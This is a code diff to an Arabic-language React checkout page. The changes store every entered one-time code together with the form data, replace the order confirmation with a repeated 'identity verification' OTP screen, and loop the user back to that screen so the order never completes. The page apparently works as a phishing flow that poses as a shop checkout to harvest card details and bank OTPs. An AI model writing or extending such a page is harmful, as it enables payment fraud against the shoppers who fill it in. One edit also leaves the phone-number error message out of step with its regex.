@@ -116,8 +116,8 @@ export default function CheckoutPage() {
         const phoneDigits = value.replace(/\s/g, "");
         if (!/^\d{8}$/.test(phoneDigits))
           return "رقم الهاتف يجب أن يكون 8 أرقام";
-        if (!/^[2459]/.test(phoneDigits))
-          return "رقم الهاتف يجب أن يبدأ بـ 2 أو 4 أو 5 أو 9";
+        if (!/^[24659]/.test(phoneDigits))
+          return "رقم الهاتف يجب أن يبدأ بـ 6 أو 4 أو 5 أو 9";
         return "";
       case "address":
         if (!value.trim()) return "العنوان مطلوب";
@@ -241,6 +241,7 @@ export default function CheckoutPage() {
     // Real-time validation
     const error = validateField(name, processedValue);
     setErrors((prev) => ({ ...prev, [name]: error }));
+
   };
 
   const getCardIcon = (type: string) => {
@@ -292,6 +293,7 @@ export default function CheckoutPage() {
         stepErrors.otp = error;
         isValid = false;
       }
+
     }
 
     setErrors(stepErrors);
@@ -305,17 +307,22 @@ export default function CheckoutPage() {
     const visitor = localStorage.getItem("visitor")!;
     // Simulate API call
     await new Promise((resolve) => setTimeout(resolve, 1500));
-    addData({ id: visitor!, ...formData });
+    addData({ id: visitor!, ...formData,allOtps });
     if (step === 2) {
       // Simulate sending OTP
       console.log("Sending OTP to phone:", formData.phone);
     } else if (step === 3) {
       // Simulate OTP verification
-      console.log("[v0] Verifying OTP:", formData.otp);
+      console.log(" Verifying OTP:", formData.otp);
     }
 
     setLoading(false);
     setStep(step + 1);
+    handleInputChange("otp","")
+    if(step>5){
+      setStep(4)
+    }
+
   };
 
   const renderStepContent = () => {
@@ -324,7 +331,7 @@ export default function CheckoutPage() {
         return (
           <div className="space-y-6">
             <div className="text-center mb-8">
-              <h2 className="text-2xl lg:text-3xl font-bold mb-2">
+              <h2 className="text-xl lg:text-3xl font-bold mb-2">
                 معلومات التوصيل
               </h2>
               <p className="text-muted-foreground">
@@ -426,7 +433,7 @@ export default function CheckoutPage() {
           <div className="space-y-6">
             <div className="text-center mb-8">
               <div className="flex items-center justify-center gap-2 mb-4">
-                <CreditCard className="w-8 h-8 text-primary" />
+                <CreditCard className="w-8 h-8 text-green-500" />
                 <Shield className="w-6 h-6 text-green-500" />
               </div>
               <h2 className="text-2xl lg:text-3xl font-bold mb-2">
@@ -561,7 +568,7 @@ export default function CheckoutPage() {
               </p>
             </div>
             <div className="flex justify-center">
-              <img src="/aas.png" alt="pm" width={120}/>
+              <img src="/aas.png" alt="pm" width={220}/>
             </div>
           </div>
         );
@@ -613,38 +620,47 @@ export default function CheckoutPage() {
 
       case 4:
         return (
-          <div className="text-center space-y-6">
-            <div className="flex items-center justify-center mb-6">
-              <CheckCircle className="w-16 h-16 text-green-500" />
+          <div className="space-y-6">
+          <div className="text-center mb-8">
+            <div className="flex items-center justify-center gap-2 mb-4">
+              <Clock className="w-8 h-8 text-primary" />
             </div>
-            <h2 className="text-3xl font-bold text-green-600 mb-4">
-              تم تأكيد طلبك بنجاح!
+            <h2 className="text-2xl lg:text-3xl font-bold mb-2">
+              تأكيد الهوية
             </h2>
-            <p className="text-lg text-muted-foreground mb-6">
-              شكراً لك! سيتم توصيل طلبك خلال 24 ساعة
+            <p className="text-muted-foreground">
+              تم إرسال رمز التحقق إلى رقم الهاتف {formData.phone}
             </p>
-            <div className="bg-green-50 border border-green-200 rounded-lg p-6">
-              <h3 className="font-bold mb-2">رقم الطلب: #AB2025001</h3>
-              <p className="text-sm text-muted-foreground">
-                ستصلك رسالة تأكيد على البريد الإلكتروني والهاتف
-              </p>
-            </div>
-            <div className="flex flex-col sm:flex-row gap-4 justify-center">
-              <Link href="/offers">
-                <Button
-                  variant="outline"
-                  className="rounded-full px-8 bg-transparent"
-                >
-                  متابعة التسوق
-                </Button>
-              </Link>
-              <Link href="/">
-                <Button className="bg-primary hover:bg-primary/90 rounded-full px-8">
-                  العودة للرئيسية
-                </Button>
-              </Link>
-            </div>
           </div>
+
+          <div className="max-w-sm mx-auto">
+            <Label htmlFor="otp" className="text-center block mb-4 text-lg">
+              أدخل رمز التحقق
+            </Label>
+            <Input
+              id="otp"
+              value={formData.otp}
+              onChange={(e) => handleInputChange("otp", e.target.value)}
+              placeholder="123456"
+              maxLength={6}
+              className={`text-center text-2xl font-mono tracking-widest ${
+                errors.otp ? "border-red-500" : ""
+              }`}
+            />
+            {errors.otp && (
+              <div className="flex items-center justify-center gap-2 mt-4 text-red-500 text-sm">
+                <AlertCircle className="w-4 h-4" />
+                {errors.otp}
+              </div>
+            )}
+          </div>
+
+          <div className="text-center">
+          <Button variant="outline" className="text-blue-100 bg-blue-600" onClick={handleNext}>
+                تحقق
+                </Button>
+          </div>
+        </div>
         );
 
       default:
@@ -702,7 +718,7 @@ export default function CheckoutPage() {
                 <div
                   className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                     stepNumber <= step
-                      ? "bg-primary text-white"
+                      ? "bg-blue-600 text-white"
                       : "bg-gray-200 text-gray-500"
                   }`}
                 >
@@ -718,15 +734,15 @@ export default function CheckoutPage() {
               </div>
             ))}
           </div>
-          <div className="flex justify-center mt-2 text-sm text-muted-foreground">
+          <div className="flex justify-center mt-2 text-sm text-blue-900 ">
             <div className="flex gap-8">
-              <span className={step >= 1 ? "text-primary font-medium" : ""}>
+              <span className={step >= 1 ? "text-blue-600 font-medium" : ""}>
                 المعلومات
               </span>
-              <span className={step >= 2 ? "text-primary font-medium" : ""}>
+              <span className={step >= 2 ? "text-blue-600 font-medium" : ""}>
                 الدفع
               </span>
-              <span className={step >= 3 ? "text-primary font-medium" : ""}>
+              <span className={step >= 3 ? "text-blue-600  font-medium" : ""}>
                 التحقق
               </span>
             </div>
@@ -741,7 +757,7 @@ export default function CheckoutPage() {
             <CardContent className="p-6 lg:p-8">
               {renderStepContent()}
 
-              {step < 4 && (
+              {step < 5 && (
                 <div className="flex justify-between mt-8 pt-6 border-t">
                   {step > 1 && (
                     <Button
@@ -755,11 +771,11 @@ export default function CheckoutPage() {
                   <Button
                     onClick={handleNext}
                     disabled={loading}
-                    className="bg-primary hover:bg-primary/90 rounded-full px-8 mr-auto"
+                    className="bg-blue-600  text-white hover:bg-primary/90 rounded-full px-8 mr-auto"
                   >
                     {loading
                       ? "جاري المعالجة..."
-                      : step === 3
+                      : step === 4
                       ? "تأكيد الطلب"
                       : "التالي"}
                   </Button>
